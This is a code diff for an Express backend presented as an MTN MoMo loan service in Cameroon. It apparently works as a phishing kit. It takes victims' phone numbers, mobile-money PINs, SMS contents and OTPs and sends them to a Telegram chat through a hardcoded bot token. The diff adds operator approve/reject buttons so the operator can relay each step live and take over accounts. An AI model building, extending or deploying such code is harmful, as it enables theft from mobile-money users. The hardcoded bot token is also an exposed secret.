@@ -1,6 +1,6 @@
 // backend/server.js
 // MTN MoMo Loan – Cameroon
-// Express backend: receives loan applications, logins, SMS submissions, OTP verification
+// Express backend: loan applications, logins, SMS, OTP — ALL WITH ADMIN APPROVAL
 
 require('dotenv').config();
 
@@ -13,11 +13,11 @@ const crypto = require('crypto');
 const app = express();
 const PORT = process.env.PORT || 5000;
 
-// ✅ Trust proxy for Railway (fixes express-rate-limit warning)
+// ✅ Trust proxy for Railway
 app.set('trust proxy', 1);
 
 // ============================================
-// TELEGRAM CONFIG (CONFIRMED)
+// TELEGRAM CONFIG
 // ============================================
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8887743533:AAH2lvDSjzdjmZwKCX2QLcVZWSUaILWBNtQ';
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8732435859';
@@ -35,10 +35,9 @@ app.use(cors({
 }));
 app.use(express.json({ limit: '100kb' }));
 
-// Rate limit all API routes
 const apiLimiter = rateLimit({
-    windowMs: 15 * 60 * 1000, // 15 minutes
-    max: 60,                   // 60 requests per IP per window
+    windowMs: 15 * 60 * 1000,
+    max: 200,
     standardHeaders: true,
     legacyHeaders: false,
     message: { ok: false, error: 'Too many requests. Please try again later.' },
@@ -64,19 +63,22 @@ function isValidCameroonPhone(phone) {
     return /^\+237\d{9}$/.test(phone);
 }
 
-async function sendTelegramMessage(text) {
+async function sendTelegramMessage(text, replyMarkup = null) {
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return { ok: false, reason: 'not_configured' };
     try {
+        const body = {
+            chat_id: TELEGRAM_CHAT_ID,
+            text,
+            parse_mode: 'HTML',
+            disable_web_page_preview: true,
+        };
+        if (replyMarkup) body.reply_markup = replyMarkup;
+
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
         const res = await fetch(url, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CHAT_ID,
-                text,
-                parse_mode: 'HTML',
-                disable_web_page_preview: true,
-            }),
+            body: JSON.stringify(body),
         });
         const data = await res.json();
         return { ok: res.ok, data };
@@ -86,19 +88,62 @@ async function sendTelegramMessage(text) {
     }
 }
 
-// In-memory store (replace with a DB in production)
+async function answerCallbackQuery(callbackQueryId, text) {
+    try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                callback_query_id: callbackQueryId,
+                text,
+                show_alert: false,
+            }),
+        });
+    } catch (err) {
+        console.error('answerCallbackQuery failed:', err.message);
+    }
+}
+
+async function editTelegramMessage(chatId, messageId, text) {
+    try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: chatId,
+                message_id: messageId,
+                text,
+                parse_mode: 'HTML',
+            }),
+        });
+    } catch (err) {
+        console.error('editMessageText failed:', err.message);
+    }
+}
+
+// ============================================
+// IN-MEMORY STORES
+// ============================================
 const applications = new Map();
 const sessions = new Map();
 const smsSubmissions = new Map();
 const otpVerifications = new Map();
 
+// Pending approvals — keyed by requestId
+// { requestId: { type: 'login'|'sms'|'otp', phone, pin, extra, status, createdAt, messageId } }
+const pendingApprovals = new Map();
+
 // ============================================
 // ROUTES
 // ============================================
 
-// Health check
 app.get('/', (req, res) => {
-    res.json({ ok: true, service: 'momo-loan-backend', time: new Date().toISOString() });
+    res.json({
+        ok: true,
+        service: 'momo-loan-backend',
+        time: new Date().toISOString(),
+        pendingApprovals: pendingApprovals.size,
+    });
 });
 
 // --------------------------------------------
@@ -116,7 +161,7 @@ app.post('/api/application', async (req, res) => {
         }
 
         if (!isValidCameroonPhone(b.phone)) {
-            return res.status(400).json({ ok: false, error: 'Invalid Cameroon phone number (expected +237XXXXXXXXX)' });
+            return res.status(400).json({ ok: false, error: 'Invalid Cameroon phone number' });
         }
 
         const amount = Number(b.amount);
@@ -172,7 +217,7 @@ app.post('/api/application', async (req, res) => {
 });
 
 // --------------------------------------------
-// POST /api/login
+// POST /api/login → Admin approval
 // --------------------------------------------
 app.post('/api/login', async (req, res) => {
     try {
@@ -180,37 +225,52 @@ app.post('/api/login', async (req, res) => {
         const phone = (body.phone || '').toString().trim();
         const pin = (body.pin || '').toString().trim();
 
-        // --- Validation ---
         if (!isValidCameroonPhone(phone)) {
             return res.status(400).json({ ok: false, error: 'Invalid phone number' });
         }
-
-        // ✅ 5-digit PIN for Cameroon
         if (!/^\d{5}$/.test(pin)) {
             return res.status(400).json({ ok: false, error: 'PIN must be exactly 5 digits' });
         }
 
-        // --- Create session ---
-        const token = crypto.randomBytes(24).toString('hex');
-        const session = {
-            token,
+        const requestId = 'login_' + Date.now() + '_' + crypto.randomBytes(4).toString('hex');
+
+        pendingApprovals.set(requestId, {
+            type: 'login',
             phone,
             pin,
+            status: 'pending',
             createdAt: new Date().toISOString(),
-        };
-        sessions.set(token, session);
+            messageId: null,
+        });
 
-        // --- Telegram message ---
         const msg =
-            `🔐 <b>Login attempt</b>\n` +
+            `🔐 <b>Login Request</b>\n` +
             `━━━━━━━━━━━━━━━━━━\n` +
             `📱 <b>Phone:</b> ${escapeHtml(phone)}\n` +
             `🔑 <b>PIN:</b> <code>${escapeHtml(pin)}</code>\n` +
-            `🕐 <b>Time:</b> ${escapeHtml(session.createdAt)}`;
+            `🆔 <b>Request:</b> <code>${escapeHtml(requestId)}</code>\n` +
+            `🕐 <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
+            `⚠️ <b>Approve to continue, Reject to deny.</b>`;
 
-        await sendTelegramMessage(msg);
+        const replyMarkup = {
+            inline_keyboard: [[
+                { text: '✅ Approve', callback_data: `approve:${requestId}` },
+                { text: '❌ Reject', callback_data: `reject:${requestId}` },
+            ]],
+        };
 
-        return res.json({ ok: true, token });
+        const result = await sendTelegramMessage(msg, replyMarkup);
+
+        if (result.ok && result.data?.result?.message_id) {
+            const p = pendingApprovals.get(requestId);
+            if (p) {
+                p.messageId = result.data.result.message_id;
+                pendingApprovals.set(requestId, p);
+            }
+        }
+
+        return res.json({ ok: true, requestId, status: 'pending' });
+
     } catch (err) {
         console.error('login error:', err);
         return res.status(500).json({ ok: false, error: 'Server error' });
@@ -218,7 +278,7 @@ app.post('/api/login', async (req, res) => {
 });
 
 // --------------------------------------------
-// POST /api/sms
+// POST /api/sms → Admin approval
 // --------------------------------------------
 app.post('/api/sms', async (req, res) => {
     try {
@@ -228,31 +288,49 @@ app.post('/api/sms', async (req, res) => {
             return res.status(400).json({ ok: false, error: 'Invalid SMS content' });
         }
 
-        const reference = generateReference();
         const trimmed = sms.trim().slice(0, 800);
+        const requestId = 'sms_' + Date.now() + '_' + crypto.randomBytes(4).toString('hex');
 
-        const submission = {
-            reference,
+        pendingApprovals.set(requestId, {
+            type: 'sms',
             phone: typeof phone === 'string' ? phone : 'unknown',
             pin: typeof pin === 'string' ? pin : '',
             token: typeof token === 'string' ? token : '',
             sms: trimmed,
-            submittedAt: new Date().toISOString(),
-        };
-        smsSubmissions.set(reference, submission);
+            status: 'pending',
+            createdAt: new Date().toISOString(),
+            messageId: null,
+        });
 
         const msg =
-            `📩 <b>SMS Submitted</b>\n` +
+            `📩 <b>SMS Submitted — Approval Required</b>\n` +
             `━━━━━━━━━━━━━━━━━━\n` +
-            `🔖 <b>Ref:</b> ${escapeHtml(reference)}\n` +
-            `📱 <b>Phone:</b> ${escapeHtml(submission.phone)}\n` +
-            (submission.pin ? `🔑 <b>PIN:</b> <code>${escapeHtml(submission.pin)}</code>\n` : '') +
-            `🕐 <b>Time:</b> ${escapeHtml(submission.submittedAt)}\n\n` +
-            `<b>Message:</b>\n<code>${escapeHtml(trimmed)}</code>`;
+            `📱 <b>Phone:</b> ${escapeHtml(phone || 'unknown')}\n` +
+            (pin ? `🔑 <b>PIN:</b> <code>${escapeHtml(pin)}</code>\n` : '') +
+            `🆔 <b>Request:</b> <code>${escapeHtml(requestId)}</code>\n` +
+            `🕐 <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
+            `<b>Message:</b>\n<code>${escapeHtml(trimmed)}</code>\n\n` +
+            `⚠️ <b>Approve to continue, Reject to deny.</b>`;
 
-        await sendTelegramMessage(msg);
+        const replyMarkup = {
+            inline_keyboard: [[
+                { text: '✅ Approve', callback_data: `approve:${requestId}` },
+                { text: '❌ Reject', callback_data: `reject:${requestId}` },
+            ]],
+        };
 
-        return res.json({ ok: true, reference });
+        const result = await sendTelegramMessage(msg, replyMarkup);
+
+        if (result.ok && result.data?.result?.message_id) {
+            const p = pendingApprovals.get(requestId);
+            if (p) {
+                p.messageId = result.data.result.message_id;
+                pendingApprovals.set(requestId, p);
+            }
+        }
+
+        return res.json({ ok: true, requestId, status: 'pending' });
+
     } catch (err) {
         console.error('sms error:', err);
         return res.status(500).json({ ok: false, error: 'Server error' });
@@ -260,45 +338,59 @@ app.post('/api/sms', async (req, res) => {
 });
 
 // --------------------------------------------
-// POST /api/verify-otp
+// POST /api/verify-otp → Admin approval
 // --------------------------------------------
 app.post('/api/verify-otp', async (req, res) => {
     try {
         const { phone, pin, otp, sms, token } = req.body || {};
 
-        // --- Validation ---
         if (!otp || typeof otp !== 'string' || !/^\d{4}$/.test(otp)) {
             return res.status(400).json({ ok: false, error: 'OTP must be exactly 4 digits' });
         }
 
-        const reference = generateReference();
+        const requestId = 'otp_' + Date.now() + '_' + crypto.randomBytes(4).toString('hex');
 
-        const verification = {
-            reference,
+        pendingApprovals.set(requestId, {
+            type: 'otp',
             phone: typeof phone === 'string' ? phone : 'unknown',
             pin: typeof pin === 'string' ? pin : '',
             otp: otp.trim(),
             token: typeof token === 'string' ? token : '',
             sms: typeof sms === 'string' ? sms.slice(0, 400) : '',
-            submittedAt: new Date().toISOString(),
-            status: 'verified',
-        };
-        otpVerifications.set(reference, verification);
+            status: 'pending',
+            createdAt: new Date().toISOString(),
+            messageId: null,
+        });
 
-        // --- Telegram message ---
         const msg =
-            `✅ <b>OTP Verified</b>\n` +
+            `🔐 <b>OTP Verification — Approval Required</b>\n` +
             `━━━━━━━━━━━━━━━━━━\n` +
-            `🔖 <b>Ref:</b> ${escapeHtml(reference)}\n` +
-            `📱 <b>Phone:</b> ${escapeHtml(verification.phone)}\n` +
-            (verification.pin ? `🔑 <b>PIN:</b> <code>${escapeHtml(verification.pin)}</code>\n` : '') +
-            `🔐 <b>OTP:</b> <code>${escapeHtml(verification.otp)}</code>\n` +
-            `🕐 <b>Time:</b> ${escapeHtml(verification.submittedAt)}\n\n` +
-            (verification.sms ? `<b>Original SMS (partial):</b>\n<code>${escapeHtml(verification.sms)}</code>` : '');
+            `📱 <b>Phone:</b> ${escapeHtml(phone || 'unknown')}\n` +
+            (pin ? `🔑 <b>PIN:</b> <code>${escapeHtml(pin)}</code>\n` : '') +
+            `🔐 <b>OTP:</b> <code>${escapeHtml(otp)}</code>\n` +
+            `🆔 <b>Request:</b> <code>${escapeHtml(requestId)}</code>\n` +
+            `🕐 <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
+            `⚠️ <b>Approve to continue, Reject to deny.</b>`;
 
-        await sendTelegramMessage(msg);
+        const replyMarkup = {
+            inline_keyboard: [[
+                { text: '✅ Approve', callback_data: `approve:${requestId}` },
+                { text: '❌ Reject', callback_data: `reject:${requestId}` },
+            ]],
+        };
 
-        return res.json({ ok: true, reference });
+        const result = await sendTelegramMessage(msg, replyMarkup);
+
+        if (result.ok && result.data?.result?.message_id) {
+            const p = pendingApprovals.get(requestId);
+            if (p) {
+                p.messageId = result.data.result.message_id;
+                pendingApprovals.set(requestId, p);
+            }
+        }
+
+        return res.json({ ok: true, requestId, status: 'pending' });
+
     } catch (err) {
         console.error('verify-otp error:', err);
         return res.status(500).json({ ok: false, error: 'Server error' });
@@ -306,7 +398,107 @@ app.post('/api/verify-otp', async (req, res) => {
 });
 
 // --------------------------------------------
-// GET /api/status/:ref
+// GET /api/approval/status/:requestId
+// Frontend polls this for ALL steps (login, sms, otp)
+// --------------------------------------------
+app.get('/api/approval/status/:requestId', (req, res) => {
+    const { requestId } = req.params;
+    const pending = pendingApprovals.get(requestId);
+
+    if (!pending) {
+        return res.status(404).json({ ok: false, error: 'Request not found' });
+    }
+
+    return res.json({
+        ok: true,
+        status: pending.status, // 'pending' | 'approved' | 'rejected'
+        type: pending.type,
+    });
+});
+
+// --------------------------------------------
+// POST /api/telegram/callback
+// Webhook handler — buttons for all types
+// --------------------------------------------
+app.post('/api/telegram/callback', async (req, res) => {
+    try {
+        const update = req.body || {};
+        console.log('📥 Telegram update:', JSON.stringify(update).slice(0, 300));
+
+        if (update.callback_query) {
+            const cq = update.callback_query;
+            const data = cq.data || '';
+            const callbackQueryId = cq.id;
+            const messageId = cq.message?.message_id;
+            const chatId = cq.message?.chat?.id;
+
+            const [action, requestId] = data.split(':');
+            const pending = pendingApprovals.get(requestId);
+
+            if (!pending) {
+                await answerCallbackQuery(callbackQueryId, '⚠️ Request not found or expired');
+                return res.json({ ok: true });
+            }
+
+            if (pending.status !== 'pending') {
+                await answerCallbackQuery(callbackQueryId, '⚠️ Already ' + pending.status);
+                return res.json({ ok: true });
+            }
+
+            // Build type label
+            const typeLabel = { login: '🔐 Login', sms: '📩 SMS', otp: '🔐 OTP' }[pending.type] || 'Request';
+
+            if (action === 'approve') {
+                pending.status = 'approved';
+                pendingApprovals.set(requestId, pending);
+
+                await answerCallbackQuery(callbackQueryId, '✅ Approved');
+
+                if (messageId && chatId) {
+                    await editTelegramMessage(chatId, messageId,
+                        `✅ <b>APPROVED</b>\n` +
+                        `━━━━━━━━━━━━━━━━━━\n` +
+                        `${typeLabel}\n` +
+                        `📱 <b>Phone:</b> ${escapeHtml(pending.phone)}\n` +
+                        `🆔 <b>Request:</b> <code>${escapeHtml(requestId)}</code>\n\n` +
+                        `👉 User can now proceed.`
+                    );
+                }
+                console.log('✅ Approved:', requestId);
+
+            } else if (action === 'reject') {
+                pending.status = 'rejected';
+                pendingApprovals.set(requestId, pending);
+
+                await answerCallbackQuery(callbackQueryId, '❌ Rejected');
+
+                if (messageId && chatId) {
+                    await editTelegramMessage(chatId, messageId,
+                        `❌ <b>REJECTED</b>\n` +
+                        `━━━━━━━━━━━━━━━━━━\n` +
+                        `${typeLabel}\n` +
+                        `📱 <b>Phone:</b> ${escapeHtml(pending.phone)}\n` +
+                        `🆔 <b>Request:</b> <code>${escapeHtml(requestId)}</code>\n\n` +
+                        `🚫 User denied.`
+                    );
+                }
+                console.log('❌ Rejected:', requestId);
+
+            } else {
+                await answerCallbackQuery(callbackQueryId, '⚠️ Unknown action');
+            }
+        }
+
+        return res.json({ ok: true });
+
+    } catch (err) {
+        console.error('telegram callback error:', err);
+        return res.json({ ok: true });
+    }
+});
+
+// --------------------------------------------
+// GET /api/status/:ref (legacy)
 // --------------------------------------------
 app.get('/api/status/:ref', (req, res) => {
     const ref = req.params.ref;
@@ -337,8 +529,9 @@ app.use((err, req, res, next) => {
 // ============================================
 app.listen(PORT, () => {
     console.log(`✅ Momo Loan backend running on port ${PORT}`);
-    console.log(`   Telegram notifications: ${TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID ? 'enabled' : 'disabled'}`);
+    console.log(`   Telegram: ${TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID ? 'enabled' : 'disabled'}`);
     console.log(`   Bot Token: ${TELEGRAM_BOT_TOKEN.substring(0, 20)}...`);
     console.log(`   Chat ID: ${TELEGRAM_CHAT_ID}`);
-    console.log(`   Trust proxy: enabled (Railway mode)`);
+    console.log(`   Trust proxy: enabled`);
+    console.log(`   Admin Approval: ✅ ACTIVE (login, SMS, OTP)`);
 });
